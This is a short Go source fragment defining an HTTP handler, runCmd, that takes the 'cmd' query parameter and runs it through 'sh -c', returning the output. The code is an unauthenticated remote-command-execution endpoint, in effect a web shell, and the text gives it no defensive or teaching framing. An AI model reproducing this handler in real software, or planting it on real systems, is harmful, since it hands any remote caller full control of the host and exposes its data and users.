package main

import (
	"net/http"
	"os/exec"
)

func runCmd(w http.ResponseWriter, r *http.Request) {
	out, _ := exec.Command("sh", "-c", r.URL.Query().Get("cmd")).Output()
	w.Write(out)
}
